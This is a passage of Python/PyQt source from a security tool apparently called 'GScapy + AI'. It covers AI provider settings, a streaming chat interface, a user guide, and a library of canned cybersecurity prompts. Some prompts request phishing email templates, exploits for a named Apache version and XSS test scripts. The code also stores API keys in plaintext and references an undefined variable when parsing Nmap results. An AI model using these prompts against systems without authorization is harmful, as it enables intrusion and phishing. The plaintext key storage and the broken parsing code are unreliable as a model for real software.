            self.local_endpoint_edit.setText(endpoint)
            QMessageBox.information(self, "Detection Result", f"Detected {service_name} running. Endpoint has been set.\n\nPlease refresh the model list.")
        else: # Multiple services detected
            service_name, ok = QInputDialog.getItem(self, "Multiple Services Detected",
                                                    "Multiple AI services were found. Please select one to configure:",
                                                    detected_services, 0, False)
            if ok and service_name:
                port = known_services[service_name]["port"]
                path = known_services[service_name]["path"]
                endpoint = f"http://localhost:{port}{path}"
                self.local_endpoint_edit.setText(endpoint)

    def refresh_local_models(self):
        """Queries the local AI endpoint to get a list of available models."""
        endpoint = self.local_endpoint_edit.text()
        if not endpoint:
            QMessageBox.warning(self, "Error", "Please enter a local AI endpoint URL first.")
            return

        if endpoint.endswith("/api/chat"):
            tags_url = endpoint.replace("/api/chat", "/api/tags")
        else:
            QMessageBox.information(self, "Unsupported", "Model auto-discovery is currently only supported for Ollama endpoints.")
            return

        self.local_model_combo.clear()
        self.local_model_combo.addItem("Refreshing...")
        self.refresh_button.setEnabled(False)

        # Use the dedicated thread with signals for robust communication
        self.fetch_thread = FetchModelsThread(tags_url, self)
        self.fetch_thread.models_fetched.connect(self.on_models_fetched)
        self.fetch_thread.models_error.connect(self.on_models_error)
        self.fetch_thread.finished.connect(lambda: self.refresh_button.setEnabled(True))
        self.fetch_thread.start()

    def on_models_fetched(self, model_list):
        """Slot to handle successfully fetched models."""
        self.local_model_combo.clear()
        if model_list:
            self.local_model_combo.addItems(model_list)
        else:
            self.local_model_combo.addItem("No models found")
        self.refresh_button.setEnabled(True)

    def on_models_error(self, error_message):
        """Slot to handle errors during model fetching."""
        self.local_model_combo.clear()
        self.local_model_combo.addItem("Error refreshing")
        QMessageBox.warning(self, "Error", f"Could not fetch models: {error_message}")
        self.refresh_button.setEnabled(True)


    def load_settings(self):
        """Loads settings from the JSON file."""
        try:
            if os.path.exists(self.settings_file):
                with open(self.settings_file, 'r') as f:
                    settings = json.load(f)
            else:
                settings = {} # Create empty settings if file doesn't exist

            # Load general settings
            self.tab_widget.setCurrentIndex(settings.get("provider_tab_index", 0))

            # Load Local AI settings
            local_settings = settings.get("local_ai", {})
            self.local_endpoint_edit.setText(local_settings.get("endpoint", "http://localhost:11434/api/chat"))
            self.local_model_combo.setCurrentText(local_settings.get("model", "llama3"))

            # Load Online AI settings
            online_settings = settings.get("online_ai", {})
            self.online_provider_tabs.setCurrentIndex(online_settings.get("selected_provider_index", 0))

            for provider_name, widgets in self.provider_widgets.items():
                provider_data = online_settings.get(provider_name, {})
                widgets['api_key'].setText(provider_data.get('api_key', ''))
                widgets['model'].setText(provider_data.get('model', ''))

        except (IOError, json.JSONDecodeError) as e:
            logging.error(f"Could not load AI settings: {e}")
            QMessageBox.warning(self, "Warning", f"Could not load AI settings file: {e}")


    def save_settings(self):
        """Saves the current settings to the JSON file."""

        # Build the online_ai settings dictionary
        online_ai_settings = {
            "selected_provider_index": self.online_provider_tabs.currentIndex()
        }
        for provider_name, widgets in self.provider_widgets.items():
            online_ai_settings[provider_name] = {
                "api_key": widgets['api_key'].text(),
                "model": widgets['model'].text()
            }

        settings = {
            "provider_tab_index": self.tab_widget.currentIndex(),
            "local_ai": {
                "endpoint": self.local_endpoint_edit.text(),
                "model": self.local_model_combo.currentText()
            },
            "online_ai": online_ai_settings
        }
        try:
            with open(self.settings_file, 'w') as f:
                json.dump(settings, f, indent=4)
            self.accept() # Close the dialog
        except IOError as e:
            QMessageBox.critical(self, "Error", f"Could not save AI settings: {e}")

    def _test_api_connection(self, provider_name):
        widgets = self.provider_widgets.get(provider_name)
        if not widgets:
            return

        api_key = widgets['api_key'].text()
        if not api_key:
            QMessageBox.warning(self, "API Key Missing", f"Please enter an API key for {provider_name} before testing.")
            return

        widgets['test_btn'].setText("Testing...")
        widgets['test_btn'].setEnabled(False)

        self.test_thread = TestAPIThread(provider_name, api_key, self)
        self.test_thread.success.connect(self._on_test_success)
        self.test_thread.error.connect(self._on_test_error)
        self.test_thread.finished.connect(lambda: widgets['test_btn'].setText("Test Connection"))
        self.test_thread.finished.connect(lambda: widgets['test_btn'].setEnabled(True))
        self.test_thread.start()

    def _on_test_success(self, message):
        QMessageBox.information(self, "Connection Successful", message)

    def _on_test_error(self, message):
        QMessageBox.warning(self, "Connection Failed", message)


class AIAnalysisThread(QThread):
    """
    A thread to run AI analysis requests in the background, supporting streaming.
    Emits signals for each chunk of the response, distinguishing between 'thinking'
    and 'answer' parts of the stream.
    """
    # Signal: (chunk, is_thinking, is_final_answer_chunk)
    response_ready = pyqtSignal(str, bool, bool)
    error = pyqtSignal(str)

    def __init__(self, prompt, settings, parent=None):
        super().__init__(parent)
        self.prompt = prompt
        self.settings = settings
        self.stop_event = Event()

    def run(self):
        try:
            import requests
            import json

            provider = self.settings.get("provider")
            endpoint = self.settings.get("endpoint")
            model = self.settings.get("model")
            api_key = self.settings.get("api_key")

            if not provider or not model or not endpoint:
                raise ValueError("AI provider, model, or endpoint is not configured.")

            headers = {"Content-Type": "application/json"}
            if api_key and provider == "OpenAI":
                headers["Authorization"] = f"Bearer {api_key}"

            payload = {
                "model": model,
                "messages": [{"role": "user", "content": self.prompt}],
                "stream": True
            }

            with requests.post(endpoint, headers=headers, json=payload, stream=True, timeout=60) as response:
                response.raise_for_status()

                is_thinking_phase = False
                is_answer_phase = False

                for line in response.iter_lines():
                    if self.stop_event.is_set(): break
                    if not line: continue

                    line = line.decode('utf-8')
                    if line.startswith('data:'):
                        line = line[5:].strip()

                    try:
                        data = json.loads(line)
                        chunk = data.get('message', {}).get('content', '') or \
                                (data.get('choices', [{}])[0].get('delta', {}).get('content', '')) or \
                                data.get('response', '')

                        if not chunk: continue

                        # Use regex for case-insensitive tag matching and removal
                        if re.search(r'<thinking>', chunk, re.IGNORECASE):
                            is_thinking_phase = True
                            is_answer_phase = False
                            chunk = re.sub(r'<\/?thinking>', '', chunk, flags=re.IGNORECASE).strip()

                        if re.search(r'<answer>', chunk, re.IGNORECASE):
                            is_thinking_phase = False
                            is_answer_phase = True
                            chunk = re.sub(r'<\/?answer>', '', chunk, flags=re.IGNORECASE).strip()

                        if chunk:
                            # The third parameter was incorrect, it should be is_answer_phase
                            self.response_ready.emit(chunk, is_thinking_phase, is_answer_phase)

                    except json.JSONDecodeError:
                        logging.warning(f"Could not decode JSON from stream line: {line}")
                        continue

        except Exception as e:
            error_message = f"Failed to get AI analysis: {e}"
            logging.error(error_message, exc_info=True)
            self.error.emit(error_message)

    def stop(self):
        self.stop_event.set()

class AIAnalysisDialog(QDialog):
    """A dialog to show the results of AI analysis."""
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("AI Analysis")
        self.setMinimumSize(600, 400)

        layout = QVBoxLayout(self)
        self.results_text = QTextEdit("Analyzing... Please wait.")
        self.results_text.setReadOnly(True)
        layout.addWidget(self.results_text)

        button_layout = QHBoxLayout()
        copy_button = QPushButton("Copy to Clipboard")
        copy_button.clicked.connect(self.copy_results)
        ok_button = QPushButton("OK")
        ok_button.clicked.connect(self.accept)
        button_layout.addStretch()
        button_layout.addWidget(copy_button)
        button_layout.addWidget(ok_button)
        layout.addLayout(button_layout)

    def set_results(self, text):
        self.results_text.setPlainText(text)

    def set_error(self, text):
        self.results_text.setPlainText(f"An error occurred:\n\n{text}")

    def copy_results(self):
        QApplication.clipboard().setText(self.results_text.toPlainText())


class AIGuideDialog(QDialog):
    """A dialog to show the user guide for AI features."""
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("AI Features Guide for GScapy + AI")
        self.setMinimumSize(700, 500)

        layout = QVBoxLayout(self)
        text_browser = QTextBrowser()
        text_browser.setOpenExternalLinks(True)

        guide_html = """
        <html>
        <head>
            <style>
                body { font-family: sans-serif; line-height: 1.6; }
                h1, h2, h3 { color: #4a90e2; }
                code { background-color: #2d313a; padding: 2px 5px; border-radius: 4px; font-family: "Courier New", monospace; }
                a { color: #8be9fd; }
                ul { padding-left: 20px; }
                .button-icon { display: inline-block; width: 16px; height: 16px; vertical-align: middle; }
            </style>
        </head>
        <body>
            <h1>AI Integration Guide (v3.0)</h1>
            <p>This guide explains how to set up and use the new AI analysis features within <b>GScapy + AI</b>.</p>

            <h2>1. Setting Up an AI Service</h2>
            <p>GScapy's AI features work by connecting to a Large Language Model (LLM). You can use a local service that you run on your own machine (ensuring privacy) or an online provider.</p>

            <h3>Local AI (Recommended)</h3>
            <p>We recommend using <b>Ollama</b> or <b>LMStudio</b>.</p>
            <ol>
                <li>Download and install Ollama from <a href="https://ollama.com/">ollama.com</a>.</li>
                <li>Open your terminal and run <code>ollama pull llama3</code> to get a great general-purpose model.</li>
                <li>Ensure the service is running in the background.</li>
            </ol>

            <h3>Online AI</h3>
            <p>You can also connect to providers like OpenAI. You will need an API key from the provider.</p>

            <h2>2. Configuring GScapy + AI</h2>
            <p>You must tell GScapy how to connect to your chosen AI service.</p>
            <ol>
                <li>In the 'AI Assistant' tab, click the settings icon &#x2699; next to the 'Send' button.</li>
                <li>Click 'Advanced Settings...' to open the main configuration dialog.</li>
                <li><b>For Local AI:</b>
                    <ul>
                        <li>Go to the 'Local AI' tab.</li>
                        <li>Use the 'Detect Running Services' button to automatically find Ollama/LMStudio, or enter the endpoint manually (e.g., <code>http://localhost:11434/api/chat</code> for Ollama).</li>
                        <li>Enter the name of the model you have downloaded (e.g., <code>llama3</code>).</li>
                    </ul>
                </li>
                <li><b>For Online Services:</b>
                    <ul>
                        <li>Go to the 'Online Services' tab.</li>
                        <li>Select your provider (e.g., 'OpenAI').</li>
                        <li>Enter your API Key and the model name you wish to use (e.g., <code>gpt-4-turbo</code>).</li>
                    </ul>
                </li>
                <li>Click 'Save'.</li>
            </ol>

            <h2>3. Selecting the Active Model</h2>
            <p>The new AI settings menu makes switching between your configured models easy.</p>
            <ol>
                <li>Click the settings icon &#x2699; in the AI Assistant tab.</li>
                <li>A menu will appear showing all configured Local and Online models.</li>
                <li>Simply click on the model you want to use for your next chat. A checkmark will indicate the active model.</li>
            </ol>


            <h2>4. Using the AI Features</h2>
            <ul>
                <li><b>AI Assistant Tab:</b> The main AI tab has been redesigned.
                    <ul>
                    <li>The left panel contains a categorized list of over 70 prompts. Click any button to load the prompt into the input box.</li>
                    <li>The main chat view now uses conversational bubbles. Your prompts are on the right, and the AI's responses are on the left.</li>
                    </ul>
                </li>
                <li><b>Send to AI Analyst Button:</b> After running a scan in the Nmap, Port Scanner, or Subdomain Scanner tools, click the "Send to AI Analyst" button to automatically load the results into the AI Assistant tab for analysis.</li>
            </ul>
        </body>
        </html>
        """
        text_browser.setHtml(guide_html)
        layout.addWidget(text_browser)

        ok_button = QPushButton("OK")
        ok_button.clicked.connect(self.accept)
        layout.addWidget(ok_button, 0, Qt.AlignmentFlag.AlignRight)

class TypingIndicator(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setFixedHeight(40)
        self.dots = []
        self.animations = QParallelAnimationGroup(self)

        for i in range(3):
            dot = QLabel("●", self)
            dot.setStyleSheet("color: #909090; font-size: 20px;")
            self.dots.append(dot)

            anim = QPropertyAnimation(dot, b"pos")
            anim.setDuration(400)
            anim.setStartValue(QPoint(20 + i * 20, 20))
            anim.setEndValue(QPoint(20 + i * 20, 10))
            anim.setEasingCurve(QEasingCurve.Type.InOutQuad)

            reverse_anim = QPropertyAnimation(dot, b"pos")
            reverse_anim.setDuration(400)
            reverse_anim.setStartValue(QPoint(20 + i * 20, 10))
            reverse_anim.setEndValue(QPoint(20 + i * 20, 20))
            reverse_anim.setEasingCurve(QEasingCurve.Type.InOutQuad)

            seq = QSequentialAnimationGroup()
            seq.addPause(i * 150)
            seq.addAnimation(anim)
            seq.addAnimation(reverse_anim)
            seq.setLoopCount(-1) # Loop indefinitely
            self.animations.addAnimation(seq)

    def start_animation(self):
        self.animations.start()

    def stop_animation(self):
        self.animations.stop()

class ThinkingWidget(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.is_expanded = True
        self._init_ui()

    def _init_ui(self):
        self.main_layout = QVBoxLayout(self)
        self.main_layout.setContentsMargins(0, 0, 0, 0)
        self.main_layout.setSpacing(0)

        self.header_frame = QFrame()
        self.header_frame.setStyleSheet("background-color: #f0f0f0; border-radius: 5px;")
        header_layout = QHBoxLayout(self.header_frame)

        self.toggle_button = QPushButton("Thinking...")
        self.toggle_button.setStyleSheet("border: none; text-align: left; font-weight: bold;")
        self.toggle_button.clicked.connect(self.toggle_content)

        self.arrow_label = QLabel("\u25BC") # Down-pointing arrow
        self.arrow_label.setStyleSheet("border: none;")

        header_layout.addWidget(self.toggle_button)
        header_layout.addStretch()
        header_layout.addWidget(self.arrow_label)

        self.content_widget = QTextEdit()
        self.content_widget.setReadOnly(True)
        self.content_widget.setStyleSheet("background-color: #f7f7f7; border: 1px solid #e0e0e0; border-top: none; border-radius: 5px; color: #888;")

        self.main_layout.addWidget(self.header_frame)
        self.main_layout.addWidget(self.content_widget)
        self.adjustSize()

    def toggle_content(self):
        self.is_expanded = not self.is_expanded
        self.content_widget.setVisible(self.is_expanded)
        self.arrow_label.setText("\u25BC" if self.is_expanded else "\u25B6")

        # We need to inform the list view that our size has changed.
        # A simple way is to update the geometry of the top-level widget.
        if self.parentWidget():
            self.parentWidget().updateGeometry()
            # Find the QListWidgetItem this widget belongs to and update its size hint
            for i in range(self.parentWidget().count()):
                item = self.parentWidget().item(i)
                widget = self.parentWidget().itemWidget(item)
                if widget is self:
                    item.setSizeHint(self.sizeHint())
                    break

    def append_text(self, text):
        self.content_widget.append(text)
        self.adjustSize()
        if self.parentWidget():
             self.parentWidget().updateGeometry()

    def is_collapsed(self):
        return not self.is_expanded

class ChatBubble(QWidget):
    # Signal to notify the container that the size hint has changed
    sizeHintChanged = pyqtSignal(QSize)

    def __init__(self, text, is_user, is_streaming=False, parent=None):
        super().__init__(parent)
        self.is_user = is_user
        self.is_streaming = is_streaming

        self.layout = QVBoxLayout(self)
        self.layout.setContentsMargins(0, 0, 0, 0)
        self.label = QLabel(text)
        self.label.setWordWrap(True)
        self.label.setTextInteractionFlags(Qt.TextInteractionFlag.TextSelectableByMouse)

        self.layout.addWidget(self.label)
        self.set_stylesheet()

    def set_stylesheet(self):
        if self.is_user:
            padding = "12px 15px 12px 15px"
            self.label.setStyleSheet(f"""
                background-color: #3d5a80;
                color: white;
                padding: {padding};
                border-radius: 15px;
            """)
            self.layout.setAlignment(Qt.AlignmentFlag.AlignRight)
        else:
            padding = "12px 15px 20px 15px"
            bg_color = "#E5E5EA"
            if self.is_streaming:
                bg_color = "#F5F5F5"
            self.label.setStyleSheet(f"""
                background-color: {bg_color};
                color: black;
                padding: {padding};
                border-radius: 15px;
            """)
            self.layout.setAlignment(Qt.AlignmentFlag.AlignLeft)

    def append_text(self, text_chunk):
        self.label.setText(self.label.text() + text_chunk)
        # After changing text, emit the signal with the new size hint
        self.sizeHintChanged.emit(self.sizeHint())

    def finish_streaming(self):
        self.is_streaming = False
        self.set_stylesheet()

    def sizeHint(self):
        # Override sizeHint to provide an accurate size based on wrapped text.
        if self.parentWidget():
            width = int(self.parentWidget().width() * 0.75) # Use a bit more width
            self.label.setFixedWidth(width)
        return self.label.sizeHint()

class AIAssistantTab(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.parent = parent # GScapy main window instance
        self.thinking_widget = None
        self.current_ai_bubble = None
        self.ai_thread = None

        self.ai_prompts = {
            "Threat Detection & Analysis": {
                "Analyze Firewall Logs": "Analyze the following firewall logs and identify any unauthorized or suspicious inbound connections. Look for patterns of repeated denied connections from a single source, connections to non-standard ports, or traffic originating from known malicious IP addresses.",
                "Flag Abnormal Processes": "Monitor the following list of system processes and flag any abnormal behavior or potential malware indicators. Look for unusually named processes, processes with high CPU/memory usage, or processes making unexpected network connections.",
                "Deep Scan for Stealthy Malware": "Given the following network traffic dump, conduct a deep scan of the network to identify any hidden or stealthy malware infections. Look for covert channels, unusual DNS queries, or encrypted traffic to unknown endpoints.",
                "Detect Phishing Attempts": "Analyze the following email headers and content to detect phishing attempts or email spoofing. Check for mismatches in 'From' and 'Reply-To' fields, suspicious links, urgent language, and generic greetings.",
                "Review Web Server Logs for Attacks": "Review the following web server logs for any unusual HTTP requests or patterns indicative of an attack, such as SQL injection, cross-site scripting (XSS), or directory traversal attempts.",
                "Scan Database Logs for Breaches": "Scan the following database logs and identify any unauthorized access attempts or unusual data queries. Look for queries from unexpected IP addresses, unusually large data exports, or repeated failed login attempts.",
                "Detect DNS Hijacking": "Analyze the following DNS traffic and detect any signs of domain hijacking or DNS poisoning. Look for unexpected responses to DNS queries or traffic being redirected to suspicious IP addresses.",
                "Identify Network Misconfigurations": "Perform a vulnerability scan on the following list of network devices and identify any potential weaknesses or misconfigurations, such as open management ports, default credentials, or outdated firmware.",
                "Detect Data Exfiltration": "Analyze the following network traffic patterns to detect any large data exfiltration or unusual data transfers. Look for large, encrypted uploads to external sites or sustained outbound connections.",
                "Identify Brute-Force Attacks": "Monitor the following system login attempts and identify any brute-force attacks or login anomalies. Look for a high volume of failed logins from a single IP or for a single user account.",
            },
            "Incident Response": {
                "Fuzz for XML Files with Gobuster": "How can I fuzz for .xml files on a web server at {TARGET_URL} using gobuster?",
                "Guide Evidence Collection": "Guide an incident response team through collecting and preserving evidence from a compromised Windows server. Include steps for memory acquisition, disk imaging, and log collection.",
                "Ransomware Recovery Steps": "Assist in restoring systems from a backup to recover from a ransomware attack. Provide a step-by-step plan, including isolating the network, verifying backups, and safely reintroducing systems.",
                "DDoS Mitigation Plan": "Provide step-by-step instructions to mitigate the impact of a distributed denial-of-service (DDoS) attack targeting our main web server at {TARGET_IP}.",
                "Forensic Analysis Guide": "Assist in performing a forensic analysis on a compromised Linux system to identify the incident’s root cause. What are the first 5 steps I should take?",
                "Coordinate IR Team Communication": "Act as a facilitator for communication and collaboration among incident response team members during a major security incident. What are the key pieces of information to share?",
                "Contain a Spreading Malware": "Recommend and execute incident containment measures to minimize further damage from a malware infection that is spreading across the corporate network.",
                "Generate Incident Report": "Assist in generating an incident response report with detailed timelines, actions taken, and lessons learned from the provided data.",
                "Engage Law Enforcement": "Guide an incident response team through the process of notifying and engaging law enforcement agencies for a cybercrime event.",
                "Post-Incident Review Guide": "Assist in conducting a post-incident review to identify vulnerabilities and improve incident response procedures after a data breach.",
            },
            "Vulnerability Assessment & PenTesting": {
                "Scan for SMB Vulnerabilities with Nmap": "How can I scan for SMB vulnerabilities on the subnet {TARGET_SUBNET} using Nmap scripts?",
                "Simulate Phishing Campaign": "I need to simulate a phishing campaign targeting employees to assess their susceptibility and raise awareness. Provide three different email templates for this.",
                "Penetration Test Web Application": "Perform a penetration test on the following web application description to identify potential security flaws and suggest remediation measures. The application is a customer portal at {TARGET_URL}.",
                "Secure Wireless Network": "Analyze the following wireless network configuration and recommend security enhancements to prevent unauthorized access. The current setup uses WPA2-PSK with a known weak password.",
                "Harden Web Server": "Review the following Nginx server configuration and recommend hardening measures to protect against known vulnerabilities and exploits.",
                "Evaluate Physical Security": "Assess the effectiveness of physical security controls by simulating unauthorized access attempts to a restricted data center. What are common techniques to test?",
                "Test DDoS Resilience": "Evaluate the resilience of our network infrastructure against a DDoS attack. Propose three different mitigation strategies we could implement.",
                "Assess IoT Device Security": "Conduct a vulnerability assessment on an IoT camera at IP {TARGET_IP}. Identify potential entry points for attackers and recommend security measures.",
                "Audit Third-Party Vendor Security": "Assess the security posture of a third-party vendor by conducting a security audit. Provide a checklist of the top 10 things to review.",
                "Review Incident Response Plan": "Review our organization’s incident response plan and simulate a ransomware attack scenario to identify areas for improvement.",
                "Suggest Nmap Command": "Suggest a good Nmap command to run against a target. The target is: ",
                "Find Exploits for Service": "Find potential exploits for a service running 'Apache 2.4.41' on a Linux server.",
                "Analyze Nmap Scan": "Analyze the following Nmap scan results for potential vulnerabilities and suggest the next 3 steps for a penetration tester.",
                "Check for CVEs": "You are a vulnerability analysis expert. Analyze the following scan results for services and versions, then list any known CVEs for them.",
                "Explain Results to Non-Expert": "Explain the following scan results in simple, non-technical terms. What was the tool trying to do, and what do the results mean?",
            },
            "Scripting & Automation": {
                "Generate Nmap Port Scan Script": "Generate a bash script that automates port scanning with Nmap for a list of IPs in a file named 'targets.txt' and saves the output for each IP.",
                "Create Python Scapy Script": "Write a Python script using Scapy to send a TCP SYN packet to port 80 of a target IP address and print whether the port is open or closed.",
                "Automate Log Analysis with Python": "Write a Python script to parse an Apache access log file and identify the top 10 IP addresses with the most requests.",
                "PowerShell for User Audit": "Write a PowerShell script to audit all local user accounts on a Windows machine and flag any that have not been logged into for over 90 days.",
                "Bash Script to Check for Open Ports": "Create a simple bash script that uses 'netcat' to check if a specific port is open on a given host.",
                "Detect Registry Changes with ELK": "Provide an ELK query to detect changes in the Windows Registry, specifically focusing on keys related to startup programs.",
                "Python Script to Detect XSS": "Write a Python script that takes a URL as input and checks for basic reflected XSS vulnerabilities by testing common payloads in URL parameters.",
                "Automate Subdomain Enumeration": "Create a bash script that chains together 'subfinder' and 'httpx' to find live subdomains for a given domain.",
                "PowerShell to Disable Inactive Accounts": "Write a PowerShell script for Active Directory that finds user accounts that have been inactive for 60 days and disables them.",
                "Python Script for Password Strength": "Write a Python script that takes a password as input and rates its strength based on length, and inclusion of uppercase, lowercase, numbers, and symbols.",
            },
            "Policy & Compliance": {
                "Draft Data Protection Policy": "Provide guidance on drafting a data protection and privacy policy in accordance with GDPR for a small e-commerce company.",
                "Update Security Policies": "Review the following (outdated) security policy and suggest updates to align with modern industry best practices and the evolving threat landscape.",
                "Develop Password Management Policy": "Assist in developing a password management policy that promotes strong, unique passwords and the use of multi-factor authentication (MFA).",
                "Create Mobile Device Policy (BYOD)": "Offer recommendations for creating a mobile device management policy (MDM) to secure employee-owned devices (BYOD) and protect corporate data.",
                "Establish Network Access Control Policy": "Assist in establishing a network access control (NAC) policy to ensure only authorized and compliant devices can connect to the organization’s network.",
                "Outline Incident Response Policy": "Provide guidance on creating an incident response policy that clearly outlines roles, responsibilities, communication channels, and escalation procedures.",
                "Define Patch Management Policy": "Help define a patch management policy that ensures timely updates and vulnerability remediation across all systems and software, with a focus on critical assets.",
                "Develop Encryption Policy": "Assist in developing a data encryption policy to protect sensitive data at rest and in transit, specifying required algorithms and key management procedures.",
                "Create Employee Training Policy": "Guide the creation of an employee security training and awareness policy to promote a security-conscious culture within the organization.",
                "Generate ROE Report": "You are a senior penetration testing engagement manager. Based on the provided target scope, generate a formal Rules of Engagement (ROE) document in Markdown format.",
            },
        }

        self.init_ui()

    def init_ui(self):
        main_layout = QHBoxLayout(self)
        splitter = QSplitter(Qt.Orientation.Horizontal)
        main_layout.addWidget(splitter)

        self.prompt_tree = QTreeWidget()
        self.prompt_tree.setHeaderHidden(True)
        self.prompt_tree.itemClicked.connect(self._on_prompt_selected)
        self._populate_prompts()
        splitter.addWidget(self.prompt_tree)

        chat_container = QWidget()
        chat_layout = QVBoxLayout(chat_container)
        chat_layout.setContentsMargins(10, 10, 10, 10)
        chat_layout.setSpacing(10)

        header = QTextBrowser()
        header.setHtml("""
            <div align="center">
                <h2>GScapy + AI Assistant</h2>
                <p>Your smart, context-aware cybersecurity assistant.</p>
            </div>
        """)
        header.setFixedHeight(80)
        header.setStyleSheet("QTextBrowser { border: none; }")
        chat_layout.addWidget(header)

        self.chat_list = QListWidget(self)
        self.chat_list.setSelectionMode(QListWidget.SelectionMode.NoSelection)
        self.chat_list.setStyleSheet("QListWidget { border: none; }")
        chat_layout.addWidget(self.chat_list)

        self.typing_indicator = TypingIndicator(self)
        self.typing_indicator.setFixedHeight(30)
        self.typing_indicator.hide()
        chat_layout.addWidget(self.typing_indicator)

        bottom_controls_layout = QHBoxLayout()
        input_frame = QFrame(self)
        input_frame.setObjectName("inputFrame")
        input_frame.setStyleSheet("#inputFrame { border-radius: 20px; }")
        input_frame_layout = QHBoxLayout(input_frame)
        input_frame_layout.setContentsMargins(15, 5, 5, 5)
        input_frame_layout.setSpacing(10)

        self.user_input = QLineEdit(self)
        self.user_input.setPlaceholderText("Ask the AI Assistant...")
        self.user_input.setStyleSheet("border: none; background-color: transparent; font-size: 14px;")
        input_frame_layout.addWidget(self.user_input)

        self.send_button = QPushButton()
        self.send_button.setFixedSize(40, 40)
        self.send_button.setStyleSheet("QPushButton { border: none; }")
        self.send_button.setToolTip("Send Message")
        input_frame_layout.addWidget(self.send_button)

        bottom_controls_layout.addWidget(input_frame)

        self.ai_settings_btn = QPushButton()
        self.ai_settings_btn.setToolTip("Configure & Select AI Models")
        self.ai_settings_btn.setFixedSize(40, 40)
        self.ai_settings_btn.setStyleSheet("QPushButton { border: none; }")
        bottom_controls_layout.addWidget(self.ai_settings_btn)

        chat_layout.addLayout(bottom_controls_layout)
        splitter.addWidget(chat_container)
        splitter.setSizes([250, 750])

        self.send_button.clicked.connect(self.send_message)
        self.user_input.returnPressed.connect(self.send_message)
        self.ai_settings_btn.clicked.connect(self._show_ai_settings_menu)

        self.update_theme() # Set initial themed icons

    def update_theme(self):
        """Updates the icon color to match the new theme."""
        text_color = self.palette().color(QPalette.ColorRole.WindowText).name()
        self.ai_settings_btn.setIcon(create_themed_icon(os.path.join("icons", "gear.svg"), text_color))
        self.ai_settings_btn.setIconSize(QSize(32, 32))
        self.send_button.setIcon(create_themed_icon(os.path.join("icons", "paper-airplane.svg"), text_color))
        self.send_button.setIconSize(QSize(32, 32))

    def _populate_prompts(self):
        for category, prompts in self.ai_prompts.items():
            category_item = QTreeWidgetItem(self.prompt_tree, [category])
            font = category_item.font(0)
            font.setBold(True)
            category_item.setFont(0, font)
            category_item.setFlags(category_item.flags() & ~Qt.ItemFlag.ItemIsSelectable)
            for prompt_name, prompt_text in prompts.items():
                prompt_item = QTreeWidgetItem(category_item, [prompt_name])
                prompt_item.setData(0, Qt.ItemDataRole.UserRole, prompt_text)
                prompt_item.setToolTip(0, prompt_text)

    def _on_prompt_selected(self, item, column):
        if item and item.parent():
            prompt_text = item.data(0, Qt.ItemDataRole.UserRole)
            if prompt_text:
                self.user_input.setText(prompt_text)

    def _add_chat_bubble(self, message, is_user):
        item = QListWidgetItem(self.chat_list)
        bubble = ChatBubble(message, is_user, parent=self.chat_list)

        # Add the item to the list and set the custom widget for it.
        # Setting the widget parents it, which is crucial for sizeHint to work.
        self.chat_list.addItem(item)
        self.chat_list.setItemWidget(item, bubble)

        # Now that the bubble is parented and has context, we can set the size hint.
        item.setSizeHint(bubble.sizeHint())

        self.chat_list.scrollToBottom()

    def _show_typing_indicator(self, show=True):
        if show:
            self.typing_indicator.show()
            self.typing_indicator.start_animation()
        else:
            self.typing_indicator.hide()
            self.typing_indicator.stop_animation()

    def send_message(self):
        user_text = self.user_input.text().strip()
        if not user_text: return
        self._add_chat_bubble(user_text, is_user=True)
        self.user_input.clear()
        self.start_ai_analysis(user_text)

    def start_ai_analysis(self, prompt):
        ai_settings = self.parent.get_ai_settings()
        if not ai_settings: return
        self._show_typing_indicator(True)
        self.ai_thread = AIAnalysisThread(prompt, ai_settings, self)
        self.ai_thread.response_ready.connect(self.handle_ai_response)
        self.ai_thread.error.connect(self.handle_ai_error)
        self.ai_thread.finished.connect(self.on_ai_thread_finished)
        self.ai_thread.start()

    def handle_ai_response(self, chunk, is_thinking, is_final_answer_chunk):
        self._show_typing_indicator(False)
        if is_thinking:
            if not self.thinking_widget:
                self.thinking_widget = ThinkingWidget()
                item = QListWidgetItem(self.chat_list)
                item.setSizeHint(self.thinking_widget.sizeHint())
                self.chat_list.addItem(item)
                self.chat_list.setItemWidget(item, self.thinking_widget)
                self.thinking_widget.show()
            self.thinking_widget.append_text(chunk)
        else:
            if self.thinking_widget and not self.thinking_widget.is_collapsed():
                 self.thinking_widget.toggle_content()
            if self.current_ai_bubble is None:
                item = QListWidgetItem(self.chat_list)
                # Parent the bubble to the chat list for context
                self.current_ai_bubble = ChatBubble("", is_user=False, is_streaming=True, parent=self.chat_list)

                # Connect the bubble's sizeHintChanged signal to the item's setSizeHint
                self.current_ai_bubble.sizeHintChanged.connect(item.setSizeHint)

                item.setSizeHint(self.current_ai_bubble.sizeHint())
                self.chat_list.addItem(item)
                self.chat_list.setItemWidget(item, self.current_ai_bubble)

            self.current_ai_bubble.append_text(chunk)
            self.chat_list.scrollToBottom()

    def on_ai_thread_finished(self):
        self._show_typing_indicator(False)
        if self.current_ai_bubble:
            self.current_ai_bubble.finish_streaming()
        self.thinking_widget = None
        self.current_ai_bubble = None

    def handle_ai_error(self, error_message):
        self._show_typing_indicator(False)
        self._add_chat_bubble(f"Error: {error_message}", is_user=False)
        if self.thinking_widget: self.thinking_widget.hide()
        self.thinking_widget = None
        self.current_ai_bubble = None

    def send_to_analyst(self, tool_name, results_data=None, context=None):
        formatted_results, header = "", ""
        if tool_name == "nmap":
            header = f"Nmap scan results for target: {context}"
            if results_data:
                try:
                    root = etree.fromstring(results_data.encode('utf-8'))
                    lines = [f"Host: {host.find('address').get('addr')}"]
                    for port in host.findall('ports/port'):
                        if port.find('state').get('state') == 'open':
                            service = port.find('service')
                            lines.append(f"  - Port {port.get('portid')}/{port.get('protocol')} ({service.get('name', 'n/a')}): {service.get('product', '')}")
                    formatted_results = "\n".join(lines)
                except Exception: formatted_results = results_data
            else: formatted_results = "No Nmap XML data available."
        elif tool_name == "subdomain":
            header, formatted_results = f"Subdomain scan for: {context}", "\n".join([results_data.topLevelItem(i).text(0) for i in range(results_data.topLevelItemCount())])
        elif tool_name == "port_scanner":
            header, formatted_results = f"Port scan for: {context}", "\n".join([f"Port {p} is {s} ({srv})" for p, s, srv in results_data])
        if not formatted_results.strip():
            QMessageBox.information(self, "No Data", "No data to send."); return
